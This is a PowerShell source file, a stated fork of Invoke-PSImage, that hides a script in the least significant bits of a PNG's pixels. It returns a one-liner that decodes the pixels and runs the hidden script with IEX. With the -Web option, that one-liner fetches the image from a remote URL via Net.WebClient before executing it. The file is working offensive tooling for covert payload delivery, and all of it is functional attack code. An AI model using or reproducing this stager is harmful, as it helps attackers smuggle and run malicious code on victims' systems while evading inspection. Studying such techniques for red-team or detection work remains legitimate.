<# Hard fork from: https://github.com/peewpw/Invoke-PSImage #>
function Invoke-PSImage {
	[CmdletBinding()] Param (
		[Parameter(Position = 0, Mandatory = $True)]
		[String]
		$Script,
    
		[Parameter(Position = 1, Mandatory = $True)]
		[String]
		$Image,
    
		[Parameter(Position = 2, Mandatory = $True)]
		[String]
		$Out,

		[switch] $Web
	)
	# Stop if we hit an error instead of making more errors
	$ErrorActionPreference = "Stop"

	# Load some assemblies
	[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing")
	[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Web")
    
	# Normalize paths beacuse powershell is sometimes bad with them
	if (-Not [System.IO.Path]::IsPathRooted($Image)) {
		$Image = [System.IO.Path]::GetFullPath((Join-Path (pwd) $Image))
	}
	if (-Not [System.IO.Path]::IsPathRooted($Out)) {
		$Out = [System.IO.Path]::GetFullPath((Join-Path (pwd) $Out))
	}
        
	# Read in the script
	$ScriptBlockString = $Script -replace "%", "$"
	$input = [ScriptBlock]::Create($ScriptBlockString)
	$payload = [system.Text.Encoding]::ASCII.GetBytes($input)

	# Read the image into a bitmap
	$img = New-Object System.Drawing.Bitmap($Image)

	$width = $img.Size.Width
	$height = $img.Size.Height

	# Lock the bitmap in memory so it can be changed programmatically.
	$rect = New-Object System.Drawing.Rectangle(0, 0, $width, $height);
	$bmpData = $img.LockBits($rect, [System.Drawing.Imaging.ImageLockMode]::ReadWrite, $img.PixelFormat)
	$ptr = $bmpData.Scan0

	# Copy the RGB values to an array for easy modification
	$bytes = [Math]::Abs($bmpData.Stride) * $img.Height
	$rgbValues = New-Object byte[] $bytes;
	[System.Runtime.InteropServices.Marshal]::Copy($ptr, $rgbValues, 0, $bytes);

	# Check that the payload fits in the image 
	if ($bytes / 2 -lt $payload.Length) {
		Write-Error "Image not large enough to contain payload!"
		$img.UnlockBits($bmpData)
		$img.Dispose()
		Break
	}

	# Generate a random string to use to fill other pixel info in the picture.
	# (Calling get-random everytime is too slow)
	$randstr = [System.Web.Security.Membership]::GeneratePassword(128, 0)
	$randb = [system.Text.Encoding]::ASCII.GetBytes($randstr)
    
	# loop through the RGB array and copy the payload into it
	for ($counter = 0; $counter -lt ($rgbValues.Length) / 3; $counter++) {
		if ($counter -lt $payload.Length) {
			$paybyte1 = [math]::Floor($payload[$counter] / 16)
			$paybyte2 = ($payload[$counter] -band 0x0f)
			$paybyte3 = ($randb[($counter + 2) % 109] -band 0x0f)
		}
		else {
			$paybyte1 = ($randb[$counter % 113] -band 0x0f)
			$paybyte2 = ($randb[($counter + 1) % 67] -band 0x0f)
			$paybyte3 = ($randb[($counter + 2) % 109] -band 0x0f)
		}
		$rgbValues[($counter * 3)] = ($rgbValues[($counter * 3)] -band 0xf0) -bor $paybyte1
		$rgbValues[($counter * 3 + 1)] = ($rgbValues[($counter * 3 + 1)] -band 0xf0) -bor $paybyte2
		$rgbValues[($counter * 3 + 2)] = ($rgbValues[($counter * 3 + 2)] -band 0xf0) -bor $paybyte3
	}

	# Copy the array of RGB values back to the bitmap
	[System.Runtime.InteropServices.Marshal]::Copy($rgbValues, 0, $ptr, $bytes)
	$img.UnlockBits($bmpData)

	# Write the image to a file
	$img.Save($Out, [System.Drawing.Imaging.ImageFormat]::Png)
	$img.Dispose()
    
	# Get a bunch of numbers we need to use in the oneliner
	$rows = [math]::Ceiling($payload.Length / $width)
	$array = ($rows * $width)
	$lrows = ($rows - 1)
	$lwidth = ($width - 1)
	$lpayload = ($payload.Length - 2)

	if ($web) {
		$pscmd = "sal a New-Object;Add-Type -AssemblyName `"System.Drawing`";`$g= a System.Drawing.Bitmap((a Net.WebClient).OpenRead(`"[OUTPUT]`"));`$o= a Byte[] $array;(0..$lrows)|% {foreach(`$x in (0..$lwidth)){`$p=`$g.GetPixel(`$x,`$_);`$o[`$_*$width+`$x]=([math]::Floor((`$p.B -band 15)*16) -bor (`$p.G -band 15))}};IEX([System.Text.Encoding]::ASCII.GetString(`$o[0..$lpayload]))"
	}
	else {
		$pscmd = "sal a New-Object;Add-Type -AssemblyName `"System.Drawing`";`$g= a System.Drawing.Bitmap(`"$Out`");`$o= a Byte[] $array;(0..$lrows)|% {foreach(`$x in (0..$lwidth)){`$p=`$g.GetPixel(`$x,`$_);`$o[`$_*$width+`$x]=([math]::Floor((`$p.B -band 15)*16) -bor (`$p.G -band 15))}};`$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString(`$o[0..$lpayload]))"
	}

	return $pscmd
}